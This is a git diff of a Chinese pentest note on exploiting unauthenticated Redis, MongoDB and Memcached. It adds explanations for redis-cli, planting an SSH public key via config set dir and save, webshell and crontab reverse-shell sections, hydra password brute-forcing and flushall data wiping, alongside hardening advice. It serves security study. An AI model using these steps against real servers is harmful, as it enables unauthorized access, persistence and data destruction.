@@ -30,16 +30,40 @@ date: 2020-1-22 20:00:01
 
 ```bash
 nmap -A -p 6379 –script redis-info 192.168.1.111		#扫描目标redis info
-
+```
+#### redis-cli
+```bash
 ./redis-cli -h 192.168.1.111
+```
+这行命令是用来连接到远程Redis服务器的。这里，./redis-cli表示运行当前目录下的redis-cli可执行文件。redis-cli是Redis的命令行客户端，用于与Redis服务器进行交互。
+接下来的参数如下：
+-h:host, 这个参数用于指定要连接的远程Redis服务器的主机名或IP地址。192.168.1.111: 这是一个示例IP地址，表示要连接到的远程Redis服务器的IP地址。
+Redis的命令行客户端redis-cli也有Windows版。虽然官方Redis团队不再维护Windows版本，但是微软的一个团队创建了一个Redis在Windows上的移植版本。这个版本包含了Windows版的redis-cli。
+
+
+
+```bash
 192.168.1.111:6739> info
 keys *			#查看所有key
 get key_name	#查看key的值，例如get password
 flushall		#删除所有数据
 del key			#删除键为key的数据
-```
 
-**上传SSH公钥获得SSH登录权限**
+121.201.22.96:6379> config get dir    #查看当前目录
+1) "dir"
+2) "D:\\Redis"
+
+config set dir <What Dir You want>
+config set dbfilename <File Name.php>
+```
+`save`    
+用于创建服务器当前数据库的磁盘快照（持久化）。它会将Redis内存中的数据保存到硬盘上的一个RDB（Redis数据库）文件中。这个文件可以用于备份、恢复数据或迁移到另一个Redis实例。
+
+当执行SAVE命令时，Redis会阻塞所有其他客户端连接，直到磁盘快照创建完成。这意味着在SAVE命令执行期间，Redis不会处理任何其他客户端请求。对于大型数据库，SAVE命令可能会花费较长时间，因此，这可能导致服务器暂时不可用。
+
+在生产环境中，通常建议使用BGSAVE命令而不是SAVE命令。BGSAVE命令会在后台异步地创建磁盘快照，而不会阻塞客户端连接。这使得在快照创建过程中，Redis仍然可以正常处理客户端请求。
+
+#### 上传SSH公钥获得SSH登录权限
 
 原理就是在数据库中插入一条数据，将本机的公钥作为value，(key值随意)
 
@@ -55,11 +79,19 @@ del key			#删除键为key的数据
 ssh-keygen -t rsa
 ```
 
-将公钥导入`key.txt`文件（前后用\n\n换行，避免和`Redis`里其他缓存数据混合）,再把`key.txt`文件内容写入目标主机的缓冲里
-
+将公钥导入`key.txt`文件（前后用\n\n换行，避免和`Redis`里其他缓存数据混合）
 ```bash
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+```
+1.`echo -e "\n\n"`: echo命令用于在命令行中输出指定的字符串。-e参数表示解释转义字符，如\n表示换行。因此，这部分命令会输出两个连续的换行符。
+2.`cat id_rsa.pub`: cat命令用于在命令行中显示文件内容。这里，它显示名为id_rsa.pub的文件的内容。通常，id_rsa.pub文件是一个公钥文件，用于SSH身份验证。
+3.`echo -e "\n\n"`: 这部分与第1部分相同，输出两个连续的换行符。
+4.`>`: 重定向操作符。它将前面命令的输出重定向到指定的文件。如果文件不存在，它将创建一个新文件。如果文件已存在，它将覆盖文件中的现有内容。
+5.`key.txt`: 这是重定向操作符>指向的文件。在这个例子中，前面的命令将把输出写入到名为key.txt的文件中。
+综上，这个命令将在key.txt文件中插入两个换行符，然后追加id_rsa.pub文件的内容，并在其后再插入两个换行符。这对于在将多个密钥文件合并到一个文件中时保持可读性是有帮助的。
 
+再把`key.txt`文件内容写入目标主机的缓冲里
+```bash
 cat key.txt | ./redis-cli -h 192.168.10.153 -x set test
 ```
 
@@ -79,7 +111,7 @@ ssh 192.168.1.111
 #cat /root/.ssh/authorized_keys 可以查看文件内容，是写入的公钥
 ```
 
-**通过`crontab`定时任务反弹shell**
+#### 通过`crontab`定时任务反弹shell
 
 原理是和写公钥一样的，只是变换一下写入的内容和路径，数据库名
 
@@ -95,7 +127,7 @@ config set dbfilename root
 save
 ```
 
-**Web目录写`WebShell`**
+#### Web目录写`WebShell`
 
 ```bash
 ./redis-cli -h 192.168.1.111
@@ -109,9 +141,9 @@ save
 hydra -P passwd.txt redis://192.168.1.111		#可以利用hydra爆破redis密码
 ```
 
-**slave主从复制实现ECE**
+#### slave主从复制实现ECE
 
-**`redis`主从复制**
+##### `redis`主从复制（master-slave replication）
 
 如果当把数据存储在单个`Redis`的实例中，当读写体量比较大的时候，服务端就很难承受。
 
@@ -119,7 +151,7 @@ hydra -P passwd.txt redis://192.168.1.111		#可以利用hydra爆破redis密码
 
 其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式
 
-**`redis`模块**
+##### `redis`模块
 
  和`mysql`类似，`redis`也支持扩展命令，我们需要编写so文件，来扩展命令。
 
@@ -226,7 +258,7 @@ save
 
 > - 使用强密码认证
 > - 降权运行 `g roupadd -r redis && useradd -r -g redis redis`，用低权限账户
-> - 限制`ip`禁止外网访问/修改默认端口   ( `redis.conf` )
+> - protected mode限制`ip`禁止外网访问/修改默认端口   ( `redis.conf` )
 > - `Redis`默认不生成日志，可以自己[配置](https://www.freebuf.com/column/158065.html)
 
 **设置防火墙策略**
@@ -264,8 +296,10 @@ MongoDB 默认是没有权限验证的，登录的用户可以通过默认端口
 1、验证
 
 ```bash
-telnet 目标IP 27017
-Navicat直接连接
+telnet 目标IP 27017测试端口是否开放
+
+Navicat直接连接。
+若报错 wire version 0，则可以切换兼容的Robo3T连接。
 ```
 
 2、修复建议
@@ -274,8 +308,11 @@ Navicat直接连接
 
 ## Memcached 未授权访问
 
-> Memcached 分布式缓存系统，默认的 11211 端口不需要密码即可访问，攻击者直接访问即可获取数据库中所有信息，造成严重的信息泄露
+> Memcached 分布式缓存系统，默认的 11211 端口不需要密码即可访问，攻击者直接访问即可获取数据库中所有信息，造成严重的信息泄露.Memcache itself provides a means to peek into its content. The memcache protocol provides commands to peek into the data that is organized by slabs (categories of data of a given size range).
 
+memcached的TCP,UDP端口都是11211
+
+打法：默认情况下，可以通过telnet做memcached做任何的操作，包括获取信息、添加健值、删除数据项目。而且一般情况下memcached是以root用户启动，可以作为攻击的点做提权获取更多的系统信息（redis也有这问题，用redis持久化写文件，添加证书、修改sshd配置项目，添加cron等，有很多服务器就是这样沦为肉鸡的）。
 1、验证
 
 ```bash
